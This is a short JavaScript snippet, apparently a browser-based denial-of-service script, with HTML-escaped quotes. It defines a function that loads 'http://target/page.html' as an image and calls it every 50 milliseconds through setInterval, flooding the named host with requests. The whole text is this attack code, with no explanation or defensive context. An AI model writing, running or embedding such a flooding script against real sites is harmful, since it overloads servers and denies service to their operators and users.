function flood() {
    var img = new Image();
    img.src = &#39;http://target/page.html&#39;;
    img.onload;
}
var floodInterval = setInterval(&#39;flood()&#39;,50);

